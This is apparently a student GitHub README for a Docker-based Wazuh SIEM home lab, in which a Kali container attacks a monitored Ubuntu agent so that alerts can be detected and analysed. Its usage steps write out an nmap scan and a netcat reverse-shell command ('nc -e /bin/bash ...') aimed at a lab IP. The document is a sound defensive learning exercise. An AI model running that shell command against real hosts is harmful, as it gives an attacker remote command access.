# 🛡️ Wazuh SIEM Home Lab Project

A fully functional Wazuh-based Security Information and Event Management (SIEM) lab environment built using Docker and Kali Linux. This project simulates a real-world SOC scenario with an attacker machine and a victim container, providing log analysis, attack detection, and agent-based monitoring.

## 🚀 Project Overview

This project is designed as part of my cybersecurity learning journey and a submission for the Erasmus Cybersecurity Program. It demonstrates my understanding of:

* SIEM setup using Wazuh
* Docker container orchestration
* Security monitoring and log collection
* Simulated cyberattacks (Nmap scan, reverse shell, and privilege escalation)
* Real-time alerting and log analysis using Wazuh Dashboard

---

## 🧠 Key Concepts Covered

* 📦 Wazuh Manager and Agent Setup in Docker
* ⚙️ Configuration of Wazuh rulesets and agents
* 🧪 Simulated Attack Scenarios

  * Nmap Scan (Reconnaissance)
  * Reverse Shell with Netcat (Initial Access)
  * Sudoers Modification (Privilege Escalation)
* 📊 Threat Detection and Alerting in Wazuh Dashboard
* 📁 JSON Alert Log Analysis from `/var/ossec/logs/alerts/alerts.json`

---

## 🛠️ Technologies Used

| Tool            | Purpose                                         |
| --------------- | ----------------------------------------------- |
| Wazuh           | SIEM and agent-based monitoring                 |
| Docker          | Containerization of attacker and victim systems |
| Kali Linux      | Attacker machine for penetration testing        |
| Ubuntu          | Victim machine monitored by Wazuh               |
| Nmap            | Reconnaissance scanning                         |
| Netcat          | Reverse shell attacks                           |
| Linux Crontab   | Persistence backdoor simulation                 |
| Wazuh Dashboard | Visual alerting and SOC interface               |

---

## 🧩 Lab Architecture

```
+----------------+        +----------------+        +------------------+
|  Kali Linux    | <----> | Wazuh Victim   | <----> | Wazuh Manager     |
|  (Attacker)    |        | (Ubuntu Agent) |        | & Dashboard       |
+----------------+        +----------------+        +------------------+
```

All machines are connected via Docker bridge networks: `wazuh-net` and `kali-net`.

---

## 📸 Screenshots to Include

Make sure to include these screenshots in your GitHub repository:

### 1. 🐳 Docker Container Setup

* `docker ps` showing manager, agent, and attacker
* `docker network inspect` showing both networks

### 2. 💟 Wazuh Dashboard

* Dashboard > Overview
* Events > Threat Hunting with logs
* Events > Rule ID filters (e.g., `2902`, `2904`, `19004`)

### 3. 🧪 Attack Execution from Kali

* Nmap scan to victim IP
* Netcat reverse shell connection attempt
* Crontab modification/persistence setup

### 4. 📄 Wazuh Alert Logs

* Tail logs from: `tail -f /var/ossec/logs/alerts/alerts.json`
* JSON entries with detected attacks

### 5. 🧙‍♂️ Victim Configuration

* `ip a` to show IP matches
* SSH enabled and listening on port 22

---

## 📂 Folder Structure

```
wazuh-siem-home-lab/
│
├── Dockerfiles/
│   ├── manager.Dockerfile
│   ├── agent.Dockerfile
│   └── attacker.Dockerfile
│
├── screenshots/
│   └── (all required images here)
│
├── docs/
│   └── architecture-diagram.png
│
├── config/
│   └── ossec.conf
│
├── README.md
└── LICENSE
```

---

## 📋 How to Use

1. Clone the repo:

   ```bash
   git clone https://github.com/yourusername/wazuh-siem-home-lab
   cd wazuh-siem-home-lab
   ```

2. Build and start Docker containers:

   ```bash
   docker-compose up -d
   ```

3. Access Wazuh Dashboard:

   ```
   http://localhost
   ```

4. Simulate attacks from Kali:

   ```bash
   nmap -sS -T4 172.19.0.2
   nc -e /bin/bash 172.19.0.2 4444
   ```

5. Monitor alerts on Wazuh dashboard or logs.

---

## 🎯 Learning Outcome

By completing this project, I developed hands-on experience in:

* Deploying a SOC lab from scratch
* Managing and monitoring endpoints
* Detecting cyberattacks with real-time alerts
* Investigating logs and rule-based alerts

---

## 🌾 Why This Project Is Special

This Wazuh SIEM Lab bridges the gap between theoretical knowledge and practical implementation. It demonstrates core skills needed in a real SOC environment — making it a strong submission for the Erasmus Cybersecurity Program and any entry-level SOC Analyst role.

---

## 📧 Contact

If you’re an Erasmus program reviewer, recruiter, or just another security enthusiast — feel free to reach out!

📨 \[Your Email]
🔗 \[LinkedIn Profile]
🔐 GitHub: \[github.com/yourusername]

---

## 📜 License

This project is open-source under the MIT License.
